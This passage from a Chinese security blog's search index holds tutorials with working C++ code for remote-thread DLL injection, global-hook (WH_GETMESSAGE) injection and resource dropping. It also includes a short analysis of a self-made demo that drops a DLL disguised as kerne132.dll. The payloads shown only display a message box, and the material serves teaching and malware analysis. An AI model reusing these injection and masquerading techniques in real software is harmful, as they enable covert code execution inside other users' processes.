MEM_RESET_UNDO0x1000000 只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值： PAGE_NOACCESS PAGE_GUARD PAGE_NOCACHE PAGE_WRITECOMBINE 返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。 WriteProcessMemory在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。 1234567BOOL WriteProcessMemory( HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten); hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。 lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。 lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。 nSize：要写入指定进程的字节数。 lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。 返回值：如果函数成功，则返回值不为0；如果失败，则为0； CreateRemoteThread创建一个在另一个进程的虚拟地址空间中运行的线程。 123456789HANDLE CreateRemoteThread( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId); hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。 lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。 dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。 lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。 lpParameter：指向要传递给线程函数的变量的指针。 dwCreationFlags：控制线程创建的标志。 值 含义 0 线程在创建后立即运行 CREATE_SUSPENDED 该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行 STACK_SIZE_PARAM_IS_A_RESERVATION 所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。 lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。 返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。 实现过程RemoteThreadInject.cpp代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172#include &quot;pch.h&quot;#include &lt;Windows.h&gt;#include &lt;processthreadsapi.h&gt;#include &lt;stdio.h&gt;BOOL CreateRemoteThreadInject(DWORD dwProcessId, WCHAR* pszDllFileName) &#123; HANDLE hProcess = NULL; DWORD dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; //获取注入进程句柄 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (hProcess == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); return FALSE; &#125; dwSize = lstrlen(pszDllFileName) + 1; //申请内存 pDllAddr = VirtualAllocEx(hProcess, NULL, 0x100, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) &#123; printf(&quot;申请内存失败\\n&quot;); return FALSE; &#125; //向申请的内存写入数据 BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * 2, NULL); if (WriteFlag == NULL) &#123; printf(&quot;写入内存失败\\n&quot;); return FALSE; &#125; //获取loadlibrary pFuncProcAddr = GetProcAddress(GetModuleHandle(L&quot;kernel32.dll&quot;), &quot;LoadLibraryW&quot;); if (pFuncProcAddr == NULL) &#123; printf(&quot;获取loadlibrary地址失败\\n&quot;); return FALSE; &#125; HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL); if (hRemoteThread == NULL) &#123; printf(&quot;创建线程失败\\n&quot;); return FALSE; &#125; WaitForSingleObject(hRemoteThread, -1); DWORD code; GetExitCodeThread(hRemoteThread, &amp;code); code = GetLastError(); VirtualFreeEx(hProcess, pDllAddr, 0, MEM_RELEASE); CloseHandle(hProcess); CloseHandle(hRemoteThread); return TRUE;&#125;int main() &#123; printf(&quot;按下回车开始注入\\n&quot;); getchar(); HWND hNotepadWindow = FindWindow(L&quot;Notepad&quot;,L&quot;无标题 - 记事本&quot;); if (hNotepadWindow == NULL) &#123; printf(&quot;打开进程失败\\n&quot;); exit(-1); &#125; DWORD dwPID = 0; GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID); if (dwPID == 0) &#123; printf(&quot;获取PID失败\\n&quot;); exit(-1); &#125; bool flag = CreateRemoteThreadInject(dwPID, L&quot;自己的文件路径&quot;); if (flag == FALSE) &#123; printf(&quot;注入失败\\n&quot;); &#125; else printf(&quot;注入成功\\n&quot;); getchar(); return 0;&#125; dllmain.cpp代码如下，主要实现一个弹窗功能。 1234567891011121314151617181920// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: MessageBox(NULL, L&quot;注入成功！&quot;, L&quot;ok&quot;, MB_OK); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 效果查看先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。 开始注入，就可以看到已经成功弹出了窗口。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"}]},{"title":"病毒分析-资源释放+钩子注入","slug":"病毒分析-资源释放+钩子注入","date":"2021-07-12T02:15:02.000Z","updated":"2021-07-12T03:52:12.644Z","comments":true,"path":"2021/07/12/病毒分析-资源释放+钩子注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。 使用dir工具先查看一下基本信息，可以看到当前程序未加壳。 再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。 再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\\Windows\\SysWOW64\\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\\Windows\\SysWOW64\\下。 使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\\Windows\\SysWOW64\\下。 然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。 到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。 使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。 查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。 使用PC hunter工具可以很方便的查看是否存在钩子。","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"病毒分析-资源释放","slug":"病毒分析-资源释放","date":"2021-07-09T01:54:29.000Z","updated":"2021-07-12T02:15:39.146Z","comments":true,"path":"2021/07/09/病毒分析-资源释放/","link":"","permalink":"https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"本篇来分析一下自己写的资源释放的小demo。 打开程序，发现没有任何改变，没有明显的行为。 使用die工具查一下文件的基本信息 查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。 还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。 可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test” 再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\\Windows\\System32下。 因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。 到路径下查找free.txt即可找到","categories":[{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}]},{"title":"注入技术-全局钩子注入","slug":"注入技术-全局钩子注入","date":"2021-07-08T09:52:07.000Z","updated":"2021-08-09T10:52:43.848Z","comments":true,"path":"2021/07/08/注入技术-全局钩子注入/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF-%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/","excerpt":"","text":"全局钩子注入windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。 局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。 函数介绍SetWindowsHookEx函数将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。 123456HHOOK SetWindowsHookExA( int idHook, HOOKPROC lpfn, HINSTANCE hmod, DWORD dwThreadId); 参数idHook：要安装的钩子程序的类型，该参数具体可以见下表。 值 含义 WH_CALLWNDPROC4 安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息 WH_CALLWNDPROCRET12 安装钩子程序，在目标窗口过程处理消息后监视消息 WH_CBT5 安装接受对CBT应用程序有用通知的钩子程序 WH_DEBUG9 安装可用于调试其他钩子程序的钩子程序 WH_FOREGROUNDIDLE11 安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用 WH_GETMESSAGE3 安装一个挂钩过程，它监视发送到消息队列的消息 WH_JOURNALPLAYBACK1 安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息 WH_JOURNALRECORD0 安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。 WH_KEYBOARD2 安装监视按键消息的挂钩过程 WH_KEYBOARD_LL13 安装监视低级键盘输入事件的挂钩过程 WH_MOUSE7 安装监视鼠标消息的挂钩过程 WH_MOUSE_LL14 安装监视低级鼠标输入事件的挂钩过程 WH_MSGFILTER-1 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息 WH_SHELL10 安装接受对于shell应用程序有用通知的钩子程序 WH_SYSMSGFILTER6 安装钩子程序，用于在对话框、消息框、菜单或滚动条中监视由于输入事件而生成的消息，钩子程序监视与调用线程相同桌面中所有应用程序的这些消息 lpfn：一个指向钩子程序的指针。如果dwThreadId参数为0或指定由不同进程创建线程标识符，则lpfn参数必须指向DLL中的钩子过程。否则，lpfn可以指向与当前进程关联的代码中的钩子过程。 hMod：包含由lpfn参数指向的钩子过程的DLL句柄。如果dwThreadId参数指定由当前进程创建线程，并且钩子过程位于与当前进程关联的代码中，则hMod参数必须设置为NULL。 dwThreadId：与钩子程序关联的线程标识符。如果此参数为0，则钩子过程与系统中所有线程相关联。 返回值如果函数成功，则返回值是钩子过程的句柄。 如果函数失败，则返回值为NULL。 实现过程创建全局钩子，钩子函数需要在一个DLL文件中。进程的地址空间是独立的，发生对应事件的进程不能调用其他进程地址空间的钩子函数。如果钩子的实现在DLL中的话，则在对应事件发生的时候，系统会把这个DLL加载到发生事件的进程地址空间之中，使它能够调用钩子函数进行处理。创建一个全局钩子之后，在对应事件发生的时候，系统就会把DLL加载到发生事件的进程中，这样就实现了DLL注入。 设置idHook的值为WH_GETMESSAGE就可以让DLL注入到所有的进程中，因为WH_GETMESSAGE类型的钩子会监视消息队列，并且Windows系统是基于消息驱动的，所有进程都会有一个自己的消息队列，都会加载WH_GETMESSAGE类型的全局钩子DLL。 DLL文件如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;//共享内存#pragma data_seg(&quot;mydata&quot;)#pragma data_seg()#pragma comment(linker, &quot;/SECTION:mydata,RWS&quot;)HMODULE g_hDllModule = NULL;HHOOK g_hHook = NULL;// 钩子回调函数LRESULT GetMsgProc(int code, WPARAM wParam, LPARAM lParam)&#123; return CallNextHookEx(g_hHook, code, wParam, lParam);&#125;// 设置全局钩子BOOL SetGlobalHook()&#123; g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, 0); if (NULL == g_hHook) &#123; return FALSE; &#125; return TRUE;&#125;// 卸载钩子BOOL UnsetGlobalHook()&#123; if (g_hHook) &#123; UnhookWindowsHookEx(g_hHook); &#125; return TRUE;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; g_hDllModule = hModule; break; &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 全局钩子是以DLL形式加载到其他进程空间之中的，且进程都是独立的，任意修改其中的一个内存里的数据是不会影响另一个进程的。所在DLL中创建了共享内存，共享内存是指突破进程独立性，多个进程共享同一段内存。在DLL中创建共享内存，就是在DLL之中创建一个变量，然后将DLL加载到多个进程空间，只要一个进程修改了该变量值，其他进程DLL中的这个值也会改变，就相当于多个进程共享一个内存。 编写一个调用DLL的程序，test.exe 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950// test.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;iostream&gt;#include &lt;Windows.h&gt;int main()&#123; typedef BOOL(*typedef_SetGlobalHook)(); typedef BOOL(*typedef_UnsetGlobalHook)(); HMODULE hDll = NULL; typedef_SetGlobalHook SetGlobalHook = NULL; typedef_UnsetGlobalHook UnsetGlobalHook = NULL; BOOL bRet = FALSE; printf(&quot;按下回车开始设置钩子\\n&quot;); getchar(); do &#123; hDll = LoadLibrary(L&quot;Hook.dll&quot;); if (NULL == hDll) &#123; printf(&quot;加载DLL失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; SetGlobalHook = (typedef_SetGlobalHook)GetProcAddress(hDll, &quot;SetGlobalHook&quot;); if (NULL == SetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; bRet = SetGlobalHook(); if (bRet) &#123; printf(&quot;设置钩子成功\\n&quot;); &#125; else &#123; printf(&quot;设置钩子失败\\n&quot;); &#125; system(&quot;pause&quot;); UnsetGlobalHook = (typedef_UnsetGlobalHook)GetProcAddress(hDll, &quot;UnsetGlobalHook&quot;); if (NULL == UnsetGlobalHook) &#123; printf(&quot;获取函数地址失败\\n错误代码%d\\n&quot;, GetLastError()); break; &#125; UnsetGlobalHook(); printf(&quot;卸载钩子成功\\n&quot;); &#125; while (FALSE); system(&quot;pause&quot;);&#125; 效果查看可以先试用PC hunter工具进行查看，可以看到当前没有任何消息钩子存在。 打开我们的test.exe，设置好钩子之后，再进行查看，刷新一下消息钩子列表，如图可以看到已经存在了一个消息钩子。 使用OD附加打开notepad.exe，再打开模块窗口。 再打开test.exe，进行钩子设置。可以很明显看到变化，已经注入成功了。 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"HOOK","slug":"HOOK","permalink":"https://b1ack1e.github.io/tags/HOOK/"}]},{"title":"资源释放","slug":"资源释放","date":"2021-07-08T03:52:26.000Z","updated":"2021-08-09T10:53:17.472Z","comments":true,"path":"2021/07/08/资源释放/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/","excerpt":"","text":"资源释放恶意代码会广泛的使用此技术，因为它可以使程序变得简洁，提高隐蔽性。如果一个程序需要额外的加载一些DLL、文本文件或者其他类型文件，将它们可以作为资源插入到程序中，在程序运行的时候再将它们释放到本地上，这样恶意代码会更加隐蔽。 函数介绍FindResource函数，确定具有指定类型和名称的资源在指定模块中的位置12345HRSRC FindResourceW( HMODULE hModule, LPCWSTR lpName, LPCWSTR lpType); hModule：处理包含资源的可执行文件模块。若hModule为NULL，则系统从当前进程的模块中装载资源。 lpName：指定资源名称 lpType：指定资源类型 返回值：如果函数运行成功，那么返回值为指定资源信息块的句柄。可将这个句柄传递给其它函数获取其他信息。如果失败，则返回NULL； SizeofResource函数：获取指定资源的字节数1234DWORD SizeofResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为资源的字节数；如果函数运行失败，则返回值为0； LoadResource函数：装载指定资源到全局存储器1234HGLOBAL LoadResource( HMODULE hModule, HRSRC hResInfo); hModule：包含资源的可执行文件模块的句柄。若hModule为NULL，则系统从当前进程的模块中装载资源。 hResInfo：资源局部。此句柄必须由函数FindResource或FindResourceEx来出创建。 返回值：如果函数运行成功，则返回值为相关资源数据的句柄。如果函数运行失败，则返回值为NULL。 LockResource函数：锁定资源并得到资源在内存中的第一个字节的指针123LPVOID LockResource( HGLOBAL hResData); hResData：装载资源的句柄。函数LoadResource可以返回这个句柄。 返回值：如果装载资源被锁住，则返回值是资源的第一个字节的指针；反之则为NULL。 实现过程创建一个test.txt文件，写入内容 在程序中添加一个自定义资源，自定义资源名称为“MYRES”，再将刚才创建的txt文件添加进去 程序实现源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// FreeRes.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &quot;pch.h&quot;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &quot;resource.h&quot;//资源控件名称，资源名称，释放后的名称BOOL FreeRes(UINT uiResourceName,TCHAR* lpszResType,char* lpszSaveFileName) &#123; //获取指定模块的资源 HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(uiResourceName), lpszResType); if (hRes == NULL) &#123; MessageBox(NULL, L&quot;获取资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //获取大小 DWORD dwSize = SizeofResource(NULL, hRes); if (dwSize == 0) &#123; MessageBox(NULL, L&quot;获取字节数失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //装载资源 HGLOBAL hGlobal = LoadResource(NULL, hRes); if (hGlobal == NULL) &#123; MessageBox(NULL, L&quot;装载资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //锁定资源 LPVOID lPvoid = LockResource(hGlobal); if(lPvoid == NULL)&#123; MessageBox(NULL, L&quot;锁定资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; //开始释放资源 FILE* fp; fopen_s(&amp;fp, lpszSaveFileName, &quot;wb+&quot;);//wb+读写打开或建立一个二进制文件，允许读和写 if (fp == NULL) &#123; MessageBox(NULL, L&quot;写入资源失败&quot;, L&quot;&quot;, NULL); return FALSE; &#125; fwrite(lPvoid, sizeof(char), dwSize, fp); fclose(fp); return TRUE;&#125;int main()&#123; printf(&quot;按下回车键开始释放资源\\n&quot;); getchar(); BOOL FLAG=FreeRes(IDR_MYRES2,TEXT(&quot;MYRES&quot;),&quot;free.txt&quot;); if (FLAG == TRUE) &#123; printf(&quot;释放成功\\n&quot;); &#125; else printf(&quot;释放失败\\n&quot;); getchar();&#125; 查看free.txt内容 参考参考《Windows黑客编程技术详解》一书","categories":[{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"}]},{"title":"写在前面的话","slug":"写在前面的话","date":"2021-07-08T03:50:10.000Z","updated":"2021-07-08T09:40:20.968Z","comments":true,"path":"2021/07/08/写在前面的话/","link":"","permalink":"https://b1ack1e.github.io/2021/07/08/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2%E7%9A%84%E8%AF%9D/","excerpt":"","text":"一直都在说要写博客，但是一直都没有很好的坚持下来，上次写博客还是大二的时候，这都过去好久了。 现在自己也搭建了一个博客，希望能够好好坚持下去吧，作为日常的学习记录，也希望能够写出一些有价值的东西。 最后的最后，我是不知名小团队satter的b1ackie。","categories":[],"tags":[]}],"categories":[{"name":"恶意代码分析实战","slug":"恶意代码分析实战","permalink":"https://b1ack1e.github.io/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/categories/CrackMe/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"HOOK技术","slug":"HOOK技术","permalink":"https://b1ack1e.github.io/categories/HOOK%E6%8A%80%E6%9C%AF/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/categories/ShellCode/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"}],"tags":[{"name":"逆向工程","slug":"逆向工程","permalink":"https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"},{"name":"病毒分析","slug":"病毒分析","permalink":"https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"},{"name":"Lab","slug":"Lab","permalink":"https://b1ack1e.github.io/tags/Lab/"},{"name":"CrackMe","slug":"CrackMe","permalink":"https://b1ack1e.github.io/tags/CrackMe/"},{"name":"恶意代码","slug":"恶意代码","permalink":"https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"},{"name":"黑客编程","slug":"黑客编程","permalink":"https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"},{"name":"传输技术","slug":"传输技术","permalink":"https://b1ack1e.github.io/tags/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF/"},{"name":"SOCKET编程","slug":"SOCKET编程","permalink":"https://b1ack1e.github.io/tags/SOCKET%E7%BC%96%E7%A8%8B/"},{"name":"压缩技术","slug":"压缩技术","permalink":"https://b1ack1e.github.io/tags/%E5%8E%8B%E7%BC%A9%E6%8A%80%E6%9C%AF/"},{"name":"隐藏技术","slug":"隐藏技术","permalink":"https://b1ack1e.github.io/tags/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF/"},{"name":"Inline Hook","slug":"Inline-Hook","permalink":"https://b1ack1e.github.io/tags/Inline-Hook/"},{"name":"ShellCode","slug":"ShellCode","permalink":"https://b1ack1e.github.io/tags/ShellCode/"},{"name":"提权技术","slug":"提权技术","permalink":"https://b1ack1e.github.io/tags/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF/"},{"name":"UAC","slug":"UAC","permalink":"https://b1ack1e.github.io/tags/UAC/"},{"name":"自启动技术","slug":"自启动技术","permalink":"https://b1ack1e.github.io/tags/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"启动技术","slug":"启动技术","permalink":"https://b1ack1e.github.io/tags/%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF/"},{"name":"PE","slug":"PE","permalink":"https://b1ack1e.github.io/tags/PE/"},{"name":"注入","slug":"注入","permalink":"https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"},{"name":"HOOK","slug":"HOOK","permalink":"https://b1ack1e.github.io/tags/HOOK/"}]}